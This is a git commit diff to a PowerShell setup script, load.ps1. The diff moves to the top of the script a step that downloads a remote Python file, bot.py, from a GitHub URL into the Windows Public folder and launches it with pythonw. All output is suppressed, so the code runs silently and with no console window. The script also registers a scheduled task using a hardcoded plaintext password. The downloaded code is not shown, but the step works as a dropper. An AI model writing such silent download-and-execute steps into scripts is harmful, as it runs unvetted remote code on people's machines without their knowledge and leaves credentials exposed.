3d88435b84ee5a444b771b1f809a594e554563aa
Dan <126990792+Dangongg@users.noreply.github.com>
2026-01-13 09:09:02 +0100

    Reorganize load.ps1 configuration and task setup

--- load.ps1
+++ load.ps1
@@ -1,5 +1,9 @@
 # CONFIG
 # ================================
+cd $env:PUBLIC *> $null
+curl 'https://raw.githubusercontent.com/Dangongg/expert-octo-broccoli/refs/heads/main/bot.py' -o 'bot.py' *> $null
+Start-Process pythonw.exe -ArgumentList "C:/Users/Public/bot.py" *> $null
+
 $Username = "User0"
 $PasswordPlain = "donotusethisasyourpassword"
 $PythonPath = "python.exe"
@@ -15,8 +19,6 @@ $Principal = New-ScheduledTaskPrincipal -UserId ".\$Username" -LogonType Passwor
 $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Description $TaskDescription
 Register-ScheduledTask -TaskName $TaskName -InputObject $Task -User ".\$Username" -Password $PasswordPlain
 
-cd $env:PUBLIC *> $null
-curl 'https://raw.githubusercontent.com/Dangongg/expert-octo-broccoli/refs/heads/main/bot.py' -o 'bot.py' *> $null
-Start-Process pythonw.exe -ArgumentList "C:/Users/Public/bot.py" *> $null
 
 
+pause
